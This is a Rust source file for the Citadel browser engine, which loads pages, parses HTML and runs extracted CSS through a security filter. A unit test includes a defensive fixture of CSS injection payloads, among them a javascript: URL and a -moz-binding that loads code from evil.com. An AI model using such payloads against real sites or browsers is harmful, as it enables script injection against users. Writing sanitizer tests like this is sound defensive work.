use std::sync::Arc;
use std::time::Duration;
use log::{info, warn, error, debug};
use url::Url;
use async_trait::async_trait;

use crate::renderer::{CitadelRenderer, RenderResult};
use citadel_parser::{parse_html, parse_css_secure, security::SecurityContext as ParserSecurityContext, Dom, CitadelStylesheet, CitadelCssProcessor};
use citadel_parser::config::ParserConfig;
use citadel_parser::SecurityLevel;
use citadel_parser::metrics::ParserMetrics;
use citadel_parser::dom::{NodeData, NodeHandle};
use std::collections::HashSet;

// Re-export ResourceLoader for downstream use
pub use crate::resource_loader::{ResourceLoader, LoadingError, ResourceLoadResult, WebRequestConfig};
use crate::renderer::FormSubmission;

/// Represents a loaded web page with all its components
#[derive(Debug, Clone)]
pub struct WebPage {
    /// Page URL
    pub url: String,
    /// Page title
    pub title: String,
    /// Page content (extracted text)
    pub content: String,
    /// Number of HTML elements
    pub element_count: usize,
    /// Security warnings found during parsing
    pub security_warnings: Vec<String>,
    /// Parsed DOM
    pub dom: Option<Arc<Dom>>,
    /// Parsed CSS stylesheet
    pub stylesheet: Option<Arc<CitadelStylesheet>>,
}

impl Default for WebPage {
    fn default() -> Self {
        Self {
            url: String::new(),
            title: String::new(),
            content: String::new(),
            element_count: 0,
            security_warnings: Vec::new(),
            dom: None,
            stylesheet: None,
        }
    }
}

/// Core browser engine that orchestrates resource loading, parsing, and rendering
pub struct CitadelEngine {
    /// Renderer component
    renderer: CitadelRenderer,
    /// Resource loader for fetching web content
    resource_loader: ResourceLoader,
    /// Parser metrics collection
    parser_metrics: Arc<ParserMetrics>,
    /// Current page URL for lifetime-safe access
    current_url: Arc<std::sync::RwLock<Option<String>>>,
    /// Current page title for lifetime-safe access
    current_title: Arc<std::sync::RwLock<Option<String>>>,
}

/// Trait for browser engine implementations
#[async_trait]
pub trait Engine: std::fmt::Debug + Send + Sync {
    /// Load a webpage from URL
    async fn load_page(&mut self, url: &str) -> Result<WebPage, LoadingError>;

    /// Load a webpage with progress tracking
    async fn load_page_with_progress(&mut self, url: &str, _tab_id: uuid::Uuid) -> Result<WebPage, LoadingError> {
        // Default implementation just calls load_page
        self.load_page(url).await
    }

    /// Render the current page
    async fn render_page(&mut self) -> Result<RenderResult, String>;

    /// Get current page URL
    fn get_current_url(&self) -> Option<String>;

    /// Get page title
    fn get_page_title(&self) -> Option<String>;

    /// Submit a form (for form handling)
    async fn submit_form(&mut self, submission: FormSubmission) -> Result<(), String>;

    /// Clone the engine (required for Message derive)
    fn clone_engine(&self) -> Box<dyn Engine>;
}

/// BrowserEngine trait alias for compatibility
pub use Engine as BrowserEngine;

#[async_trait]
impl Engine for CitadelEngine {
    async fn load_page(&mut self, url: &str) -> Result<WebPage, LoadingError> {
        let result = self.fetch_and_parse_page(url).await?;
        info!("✅ Page loaded successfully: {}", result.title);
        Ok(result)
    }

    async fn render_page(&mut self) -> Result<RenderResult, String> {
        // Render the current page and return metrics
        let start_time = std::time::Instant::now();
        let _element = self.renderer.render();
        let render_time = start_time.elapsed().as_millis() as u64;

        Ok(RenderResult::success(
            1, // elements_rendered - will be calculated properly later
            render_time,
            800.0, // viewport_width - from current viewport size
            600.0, // viewport_height - from current viewport size
        ))
    }

    fn get_current_url(&self) -> Option<String> {
        // Use Arc<RwLock<Option<String>>> to provide lifetime-safe access
        let url_guard = self.current_url.read().unwrap();
        url_guard.clone()
    }

    fn get_page_title(&self) -> Option<String> {
        // Use Arc<RwLock<Option<String>>> to provide lifetime-safe access
        let title_guard = self.current_title.read().unwrap();
        title_guard.clone()
    }

    async fn submit_form(&mut self, submission: FormSubmission) -> Result<(), String> {
        // For now, just log the form submission
        // TODO: Implement actual form submission logic
        log::info!("Form submitted: action={}, method={}",
                  submission.action,
                  submission.method);
        Ok(())
    }

    fn clone_engine(&self) -> Box<dyn Engine> {
        // For now, create a new engine - this is a limitation
        // In a full implementation, we'd want to properly clone the state
        // For now, we'll use a blocking approach which isn't ideal but works
        let rt = tokio::runtime::Runtime::new().unwrap();
        let resource_loader = rt.block_on(async {
            ResourceLoader::new(
                Arc::new(citadel_security::SecurityContext::new(10))
            ).await.unwrap()
        });

        Box::new(CitadelEngine {
            renderer: CitadelRenderer::new(),
            resource_loader,
            parser_metrics: self.parser_metrics.clone(),
            current_url: self.current_url.clone(),
            current_title: self.current_title.clone(),
        })
    }
}

impl std::fmt::Debug for CitadelEngine {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("CitadelEngine")
            .field("renderer", &"CitadelRenderer")
            .field("resource_loader", &"ResourceLoader")
            .field("parser_metrics", &self.parser_metrics)
            .field("current_url", &"Arc<RwLock<Option<String>>>")
            .field("current_title", &"Arc<RwLock<Option<String>>>")
            .finish()
    }
}

impl CitadelEngine {
    /// Create a new browser engine instance
    pub async fn new() -> Result<Self, Box<dyn std::error::Error + Send + Sync>> {
        // Create security context
        let security_context = Arc::new(citadel_security::SecurityContext::new(10));

        // Create resource loader
        let resource_loader = ResourceLoader::new(security_context).await?;

        Ok(Self {
            renderer: CitadelRenderer::new(),
            resource_loader,
            parser_metrics: Arc::new(ParserMetrics::default()),
            current_url: Arc::new(std::sync::RwLock::new(None)),
            current_title: Arc::new(std::sync::RwLock::new(None)),
        })
    }

    /// Create a new browser engine with custom resource loader
    pub fn with_resource_loader(resource_loader: ResourceLoader) -> Self {
        Self {
            renderer: CitadelRenderer::new(),
            resource_loader,
            parser_metrics: Arc::new(ParserMetrics::default()),
            current_url: Arc::new(std::sync::RwLock::new(None)),
            current_title: Arc::new(std::sync::RwLock::new(None)),
        }
    }

    /// Create a new browser engine with custom renderer and resource loader
    pub fn new_with_components(renderer: CitadelRenderer, resource_loader: ResourceLoader) -> Self {
        Self {
            renderer,
            resource_loader,
            parser_metrics: Arc::new(ParserMetrics::default()),
            current_url: Arc::new(std::sync::RwLock::new(None)),
            current_title: Arc::new(std::sync::RwLock::new(None)),
        }
    }

    /// Fetch a webpage from URL and parse it with nation-state security
    pub async fn fetch_and_parse_page(&mut self, url: &str) -> Result<WebPage, LoadingError> {
        info!("🌐 Loading page: {}", url);

        let response = self.resource_loader.fetch_webpage(url).await?;
        let final_url = self.resource_loader.get_current_url().unwrap_or_else(|| url.to_string());

        let (title, content, element_count, security_warnings, dom, stylesheet) =
            self.parse_html_content_with_css(&response, &final_url).await.map_err(|e|
                LoadingError::ParseError(format!("Failed to parse content: {}", e))
            )?;

        // Update renderer with parsed content
        self.renderer.update_content(dom.clone(), stylesheet.clone()).map_err(|e| {
            LoadingError::SecurityViolation(format!("Failed to update renderer: {}", e))
        })?;

        // Update resource loader with page info
        self.resource_loader.update_page_info(Some(Url::parse(&final_url).unwrap_or_else(|_| Url::parse(url).unwrap())), Some(title.clone()));

        // Update engine's current URL and title
        *self.current_url.write().unwrap() = Some(final_url.clone());
        *self.current_title.write().unwrap() = Some(title.clone());

        Ok(WebPage {
            url: final_url,
            title,
            content,
            element_count,
            security_warnings,
            dom: Some(dom),
            stylesheet: Some(stylesheet),
        })
    }

    /// Parse HTML content and CSS with nation-state level security processing
    async fn parse_html_content_with_css(&mut self, html: &str, url: &str) -> Result<(String, String, usize, Vec<String>, Arc<Dom>, Arc<CitadelStylesheet>), String> {
        info!("🔍 Parsing HTML content with enhanced CSS security: {} bytes", html.len());

        // Create security context with maximum protection for HTML parsing
        let parser_security_context_html = Arc::new(ParserSecurityContext::new(15)); // 15 max nesting depth

        // Parse HTML using citadel-parser with security context
        let dom = parse_html(html, parser_security_context_html)
            .map_err(|e| format!("HTML parsing failed: {}", e))?;

        // Extract page title from DOM
        let title = dom.get_title();
        let title = if title.is_empty() { url.to_string() } else { title };

        // Extract main text content for display from DOM
        let content = dom.get_text_content();

        // Count elements (using DOM's metrics for accuracy)
        let element_count = dom.get_metrics().elements_created.load(std::sync::atomic::Ordering::Relaxed);

        // Extract CSS content from style tags and linked stylesheets
        let (extracted_css, mut css_warnings) = self.extract_css_from_dom(&dom, url).await;

        // Combine base CSS with extracted CSS
        let base_css = self.get_base_css();
        let combined_css = if extracted_css.is_empty() {
            info!("📝 Using base CSS only (no website CSS found)");
            base_css.to_string()
        } else {
            info!("🔗 Combining base CSS with {} bytes of extracted website CSS", extracted_css.len());
            format!("{}\n\n/* Website CSS - Sanitized for Security */\n{}", base_css, extracted_css)
        };

        // Process CSS with nation-state level security
        info!("🛡️ Applying nation-state security filtering to CSS...");
        let stylesheet = self.process_css_with_max_security(&combined_css)
            .map_err(|e| format!("CSS security processing failed: {}", e))?;

        info!("✅ Enhanced parsing completed: {} elements, {} bytes CSS, {} security warnings",
                   element_count, combined_css.len(), 0);

        Ok((title, content, element_count, css_warnings, Arc::new(dom), Arc::new(stylesheet)))
    }

    /// Process CSS with maximum nation-state security protection
    fn process_css_with_max_security(&self, css_content: &str) -> Result<CitadelStylesheet, String> {
        // Create security-first parser configuration
        let config = ParserConfig {
            security_level: SecurityLevel::Maximum,
            max_depth: 10, // Very limited depth for CSS
            max_attr_length: 500, // Limited attribute length
            allow_comments: false, // No comments for security
            allow_processing_instructions: false, // No processing instructions
            allow_scripts: false, // No scripts for CSS
            allow_external_resources: false, // No external resources
            max_nesting_depth: 5, // Very limited nesting
            max_css_size: 100 * 1024, // 100KB max CSS size
        };

        // Create CSS processor with nation-state security
        let processor = CitadelCssProcessor::new(config, self.parser_metrics.clone());

        // Process CSS with comprehensive security analysis
        match processor.process_css(css_content) {
            Ok(result) => {
                // Log security analysis results
                let analysis = &result.security_analysis;
                let metadata = &result.processing_metadata;

                match analysis.threat_level {
                    citadel_parser::css_security::CssThreatLevel::Safe => {
                        info!("✅ CSS processed safely: {} rules", result.stylesheet.rules.len());
                    }
                    citadel_parser::css_security::CssThreatLevel::Suspicious => {
                        warn!("⚠️  Suspicious CSS detected and sanitized: {} threats neutralized, {} rules modified",
                              metadata.threats_neutralized, analysis.modified_rules.len());
                    }
                    citadel_parser::css_security::CssThreatLevel::Dangerous => {
                        warn!("🚨 Dangerous CSS detected: {} threats neutralized, {} rules blocked",
                              metadata.threats_neutralized, analysis.blocked_rules.len());
                    }
                    citadel_parser::css_security::CssThreatLevel::Critical => {
                        error!("🛑 CRITICAL CSS threats detected: {} threats neutralized", metadata.threats_neutralized);
                    }
                }

                // Log processing metrics
                info!("📊 CSS Security Metrics:");
                info!("   • Original size: {} bytes", metadata.original_size_bytes);
                info!("   • Sanitized size: {} bytes", metadata.sanitized_size_bytes);
                info!("   • Compression ratio: {:.2}%", metadata.compression_ratio * 100.0);
                info!("   • Processing time: {} μs", metadata.processing_time_us);
                info!("   • Memory usage: {} KB", metadata.memory_usage_bytes / 1024);
                info!("   • Final rules: {}", result.stylesheet.rules.len());

                // Log specific attack types detected
                if !analysis.attack_types.is_empty() {
                    warn!("🔍 Attack vectors detected:");
                    for attack_type in &analysis.attack_types {
                        match attack_type {
                            citadel_parser::css_security::CssAttackType::ScriptInjection => {
                                warn!("   • Script injection attempt blocked");
                            }
                            citadel_parser::css_security::CssAttackType::Fingerprinting => {
                                warn!("   • Browser fingerprinting attempt blocked");
                            }
                            citadel_parser::css_security::CssAttackType::ResourceExhaustion => {
                                warn!("   • Resource exhaustion attack blocked");
                            }
                            citadel_parser::css_security::CssAttackType::TimingAttack => {
                                warn!("   • Timing attack vector blocked");
                            }
                            citadel_parser::css_security::CssAttackType::NetworkExfiltration => {
                                warn!("   • Network exfiltration attempt blocked");
                            }
                            citadel_parser::css_security::CssAttackType::SideChannel => {
                                warn!("   • Side-channel attack blocked");
                            }
                            citadel_parser::css_security::CssAttackType::DataExfiltration => {
                                warn!("   • Data exfiltration attempt blocked");
                            }
                        }
                    }
                }

                Ok(result.stylesheet)
            }
            Err(e) => {
                // Fall back to secure parsing if advanced processing fails
                warn!("⚠️ Advanced CSS processing failed, falling back to secure parsing: {}", e);
                parse_css_secure(css_content).map_err(|e| format!("Secure CSS fallback failed: {}", e))
            }
        }
    }

    /// Extract CSS content from DOM style tags and linked stylesheets
    async fn extract_css_from_dom(&self, dom: &Dom, base_url: &str) -> (String, Vec<String>) {
        let mut inline_styles = Vec::new();
        let mut external_links: HashSet<String> = HashSet::new();
        let mut warnings = Vec::new();

        // Collect inline <style> contents and external stylesheet links
        self.collect_css_nodes(&dom.document_node_handle, &mut inline_styles, &mut external_links);

        let mut external_css_blocks = Vec::new();
        let base = match Url::parse(base_url) {
            Ok(url) => url,
            Err(e) => {
                warn!("⚠️  Unable to parse base URL for stylesheet resolution ({}): {}", base_url, e);
                warnings.push(format!("Unable to resolve stylesheets for {}: {}", base_url, e));
                return (inline_styles.join("\n"), warnings);
            }
        };

        // Fetch external stylesheets securely
        for href in external_links {
            match base.join(&href) {
                Ok(resolved) => match self.resource_loader.load_css(resolved.clone()).await {
                    Ok(css_text) => {
                        info!("🎨 Loaded external stylesheet: {}", resolved);
                        external_css_blocks.push(css_text);
                    }
                    Err(err) => {
                        warn!("⚠️  Failed to fetch stylesheet {}: {}", resolved, err);
                        warnings.push(format!("Failed to fetch stylesheet {}: {}", resolved, err));
                    }
                },
                Err(err) => {
                    warn!("⚠️  Invalid stylesheet href '{}': {}", href, err);
                    warnings.push(format!("Invalid stylesheet href '{}': {}", href, err));
                }
            }
        }

        // Combine inline and external CSS blocks
        let mut combined_css = String::new();
        for css in inline_styles {
            if !combined_css.is_empty() {
                combined_css.push('\n');
            }
            combined_css.push_str(css.trim());
            combined_css.push('\n');
        }

        for css in external_css_blocks {
            if !combined_css.is_empty() {
                combined_css.push('\n');
            }
            combined_css.push_str(css.trim());
            combined_css.push('\n');
        }

        (combined_css, warnings)
    }

    /// Recursively collect inline <style> blocks and linked stylesheets
    fn collect_css_nodes(&self, node_handle: &NodeHandle, inline_styles: &mut Vec<String>, external_links: &mut HashSet<String>) {
        if let Ok(node) = node_handle.read() {
            if let NodeData::Element(element) = &node.data {
                let tag_name = element.local_name().to_ascii_lowercase();

                if tag_name == "style" {
                    let mut css_text = String::new();
                    for child in node.children() {
                        if let Ok(child_node) = child.read() {
                            if let NodeData::Text(text) = &child_node.data {
                                css_text.push_str(text);
                            }
                        }
                    }

                    let trimmed = css_text.trim();
                    if !trimmed.is_empty() {
                        inline_styles.push(trimmed.to_string());
                    }
                } else if tag_name == "link" {
                    if let Some(rel) = element.get_attribute("rel") {
                        if rel.to_ascii_lowercase().contains("stylesheet") {
                            if let Some(href) = element.get_attribute("href") {
                                external_links.insert(href);
                            }
                        }
                    }
                }
            }

            for child in node.children() {
                self.collect_css_nodes(child, inline_styles, external_links);
            }
        }
    }

    /// Get base CSS for the browser
    fn get_base_css(&self) -> &'static str {
        r#"
/* Citadel Browser Base Styles - Nation-State Security Hardened */

/* Reset and base styles */
* {
    box-sizing: border-box;
}

html, body {
    margin: 0;
    padding: 0;
    font-family: system-ui, -apple-system, sans-serif;
    line-height: 1.6;
    color: #333;
    background-color: #fff;
}

/* Typography */
h1, h2, h3, h4, h5, h6 {
    margin-top: 0;
    margin-bottom: 0.5em;
    font-weight: 600;
    line-height: 1.25;
}

h1 { font-size: 2em; }
h2 { font-size: 1.5em; }
h3 { font-size: 1.25em; }

p {
    margin-top: 0;
    margin-bottom: 1em;
}

/* Links */
a {
    color: #0066cc;
    text-decoration: none;
}

a:hover {
    text-decoration: underline;
}

/* Layout */
div, span, section, article, header, footer, nav, main, aside {
    display: block;
}

/* Safe default display values */
img {
    display: inline-block;
    max-width: 100%;
    height: auto;
}

/* Form elements */
input, textarea, select, button {
    font-family: inherit;
    font-size: inherit;
    line-height: inherit;
}

button {
    cursor: pointer;
}

/* Tables */
table {
    border-collapse: collapse;
    width: 100%;
}

th, td {
    padding: 8px;
    text-align: left;
    border-bottom: 1px solid #ddd;
}

/* Security: Block dangerous CSS features */
script, iframe, object, embed {
    display: none !important;
}

/* Privacy: Prevent fingerprinting */
@font-face {
    /* Blocked to prevent font fingerprinting */
}

* {
    -webkit-touch-callout: none;
    -webkit-user-select: none;
    -khtml-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    user-select: none;
}

p, div, span, h1, h2, h3, h4, h5, h6 {
    -webkit-user-select: text;
    -khtml-user-select: text;
    -moz-user-select: text;
    -ms-user-select: text;
    user-select: text;
}
"#
    }

    /// Parse HTML content with security and privacy protections (legacy method)
    async fn parse_html_content(&self, html: &str, url: &str) -> Result<(String, String, usize), String> {
        info!("Parsing HTML content for {}: {} bytes", url, html.len());

        // Parse HTML using citadel-parser
        // Convert security context from citadel-security to citadel-parser format
        let parser_security_context = Arc::new(ParserSecurityContext::new(15)); // 15 max nesting depth
        let dom = parse_html(html, parser_security_context)
            .map_err(|e| format!("HTML parsing failed: {}", e))?;

        // Extract page title from DOM
        let title = dom.get_title();
        let title = if title.is_empty() { url.to_string() } else { title };

        // Extract main text content for display from DOM
        let content = dom.get_text_content();

        // Count elements (simplified)
        let element_count = html.matches('<').count();

        info!("Successfully parsed page: {} elements, {} bytes", element_count, html.len());

        Ok((title, content, element_count))
    }

    /// Extract title from HTML content
    fn extract_title(&self, html: &str) -> Option<String> {
        // Simple regex-based title extraction
        if let Some(start) = html.find("<title>") {
            if let Some(end) = html[start + 7..].find("</title>") {
                return Some(html[start + 7..start + 7 + end].trim().to_string());
            }
        }
        None
    }

    /// Get reference to the renderer
    pub fn renderer(&self) -> &CitadelRenderer {
        &self.renderer
    }

    /// Get mutable reference to the renderer
    pub fn renderer_mut(&mut self) -> &mut CitadelRenderer {
        &mut self.renderer
    }

    /// Get reference to the resource loader
    pub fn resource_loader(&self) -> &ResourceLoader {
        &self.resource_loader
    }

    /// Get mutable reference to the resource loader
    pub fn resource_loader_mut(&mut self) -> &mut ResourceLoader {
        &mut self.resource_loader
    }

    /// Get parser metrics
    pub fn get_parser_metrics(&self) -> &ParserMetrics {
        &self.parser_metrics
    }

    /// Reset parser metrics
    pub fn reset_parser_metrics(&self) {
        self.parser_metrics.reset();
    }
}

impl Default for CitadelEngine {
    fn default() -> Self {
        // Create a new engine with a blocking runtime
        let rt = tokio::runtime::Runtime::new().unwrap();
        rt.block_on(async {
            CitadelEngine::new().await.unwrap()
        })
    }
}

/// Create a new engine instance with default configuration
pub async fn create_engine() -> Result<CitadelEngine, Box<dyn std::error::Error + Send + Sync>> {
    CitadelEngine::new().await
}

/// Create a new engine instance with custom timeout
pub async fn create_engine_with_timeout(timeout: Duration) -> Result<CitadelEngine, Box<dyn std::error::Error + Send + Sync>> {
    // For now, timeout is handled at the networking level
    // This creates a standard engine
    CitadelEngine::new().await
}

#[cfg(test)]
mod tests {
    use super::*;
  
    #[tokio::test]
    async fn test_engine_creation() {
        let engine = CitadelEngine::new().await.unwrap();
        assert!(engine.get_current_url().is_none());
        assert!(engine.get_page_title().is_none());
    }

    #[tokio::test]
    async fn test_html_parsing() {
        let engine = CitadelEngine::new().await.unwrap();
        let html = r#"
<!DOCTYPE html>
<html>
<head><title>Test Page</title></head>
<body>
    <h1>Hello World</h1>
    <p>This is a test page.</p>
</body>
</html>
"#;

        let result = engine.parse_html_content(html, "http://localhost").await;
        assert!(result.is_ok());

        let (title, content, element_count) = result.unwrap();
        assert_eq!(title, "Test Page");
        assert!(content.contains("Hello World"));
        assert!(content.contains("This is a test page"));
        assert!(element_count > 0);
    }

    #[tokio::test]
    async fn test_css_processing() {
        let engine = CitadelEngine::new().await.unwrap();

        let safe_css = r#"
            body {
                color: #333;
                background-color: #fff;
                font-size: 16px;
            }

            .container {
                max-width: 1200px;
                margin: 0 auto;
            }
        "#;

        let result = engine.process_css_with_max_security(safe_css);
        assert!(result.is_ok());

        let stylesheet = result.unwrap();
        assert!(!stylesheet.rules.is_empty());
    }

    #[tokio::test]
    async fn test_malicious_css_blocking() {
        let engine = CitadelEngine::new().await.unwrap();

        let malicious_css = r#"
            body {
                background: url('javascript:alert(1)');
                behavior: url(#default#time2);
                -moz-binding: url("http://evil.com/xbl.xml#exec");
            }
        "#;

        let result = engine.process_css_with_max_security(malicious_css);
        // Should either succeed (sanitized) or fail (blocked)
        match result {
            Ok(stylesheet) => {
                // If it succeeds, verify dangerous content was removed
                let css_text = stylesheet.to_string();
                assert!(!css_text.contains("javascript:"));
                assert!(!css_text.contains("behavior:"));
                assert!(!css_text.contains("-moz-binding:"));
            }
            Err(_) => {
                // If it fails, that's also acceptable for malicious content
            }
        }
    }

    #[tokio::test]
    async fn test_engine_with_timeout() {
        let timeout = Duration::from_secs(30);
        let engine = create_engine_with_timeout(timeout).await.unwrap();
        assert!(engine.get_current_url().is_none());
    }

    #[tokio::test]
    async fn test_page_load() {
        // Simple test without external server dependency
        let mut engine = CitadelEngine::new().await.unwrap();

        // Test loading a real URL (this will attempt network access)
        let result = engine.load_page("https://example.com").await;

        // We don't care if it succeeds or fails in this test environment
        // We just want to verify the method signature and basic functionality
        match result {
            Ok(_) => {
                // If it loads, check basic structure
                assert!(engine.get_current_url().is_some());
            }
            Err(_) => {
                // Network failures are acceptable in test environment
                // This validates the error handling path
            }
        }
    }

    #[tokio::test]
    async fn test_engine_metrics() {
        let engine = CitadelEngine::new().await.unwrap();
        let metrics = engine.get_parser_metrics();

        // Initially should have default values
        assert_eq!(metrics.elements_parsed.load(std::sync::atomic::Ordering::Relaxed), 0);

        // Reset should work
        engine.reset_parser_metrics();
        assert_eq!(metrics.elements_parsed.load(std::sync::atomic::Ordering::Relaxed), 0);
    }
}
